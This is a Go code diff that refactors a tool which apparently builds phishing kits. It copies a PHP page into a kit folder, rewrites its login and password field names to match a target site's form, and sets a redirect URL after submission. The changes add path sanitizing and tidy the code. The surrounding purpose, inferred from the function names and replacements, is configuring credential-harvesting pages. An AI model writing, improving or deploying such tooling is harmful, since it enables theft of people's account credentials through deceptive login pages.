@@ -5,42 +5,59 @@ import (
 	"html"
 	"os"
 	"path"
+	"path/filepath"
+	"regexp"
 )
 
+// sanitizeFilename sanitizes the filename to prevent path injection.
+func sanitizeFilename(filename string) string {
+	// Remove any path separators and other potentially dangerous characters
+	re := regexp.MustCompile(`[<>:"/\\|?*]`)
+	return re.ReplaceAllString(filename, "")
+}
+
+// sanitizePath sanitizes the path to prevent path injection.
+func sanitizePath(p string) string {
+	// Clean the path and ensure it is relative
+	return filepath.Clean(p)
+}
+
 // copyPhpToKit copies the PHP file to the destination folder.
-func copyPhpToKit(phpfilename string, destFolder string) error {
-	phpfile, err := os.ReadFile(phpfilename)
+func copyPhpToKit(phpFilename string, destFolder string) error {
+	phpFilename = sanitizeFilename(phpFilename)
+	destFolder = sanitizePath(destFolder)
+
+	phpFile, err := os.ReadFile(phpFilename)
 	if err != nil {
 		return err
 	}
-	if err := os.WriteFile(path.Join(destFolder, phpfilename), phpfile, 0644); err != nil {
-		return err
-	}
-	return nil
+	destPath := path.Join(destFolder, phpFilename)
+	return os.WriteFile(destPath, phpFile, 0644)
 }
 
 // patchPhp patches the PHP file with URL redirection and correct attribute names for credentials.
-func patchPhp(phppath string, postLogin string, postPassword string, urlin string) error {
-	contents, err := os.ReadFile(phppath)
+func patchPhp(phpPath string, postLogin string, postPassword string, urlin string) error {
+	phpPath = sanitizePath(phpPath)
+
+	contents, err := os.ReadFile(phpPath)
 	if err != nil {
 		return err
 	}
-	newContents := []byte(contents)
 
+	// Escape and replace login attribute if necessary
 	if postLogin != "login" {
 		postLogin = html.EscapeString(postLogin)
-		newContents = bytes.Replace(newContents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"), -1)
+		contents = bytes.ReplaceAll(contents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"))
 	}
 
+	// Escape and replace password attribute if necessary
 	if postPassword != "password" {
 		postPassword = html.EscapeString(postPassword)
-		newContents = bytes.Replace(newContents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"), -1)
+		contents = bytes.ReplaceAll(contents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"))
 	}
 
-	newContents = bytes.Replace(newContents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"), -1)
+	// Replace URL redirection
+	contents = bytes.ReplaceAll(contents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"))
 
-	if err := os.WriteFile(phppath, newContents, 0); err != nil {
-		return err
-	}
-	return nil
+	return os.WriteFile(phpPath, contents, 0644)
 }
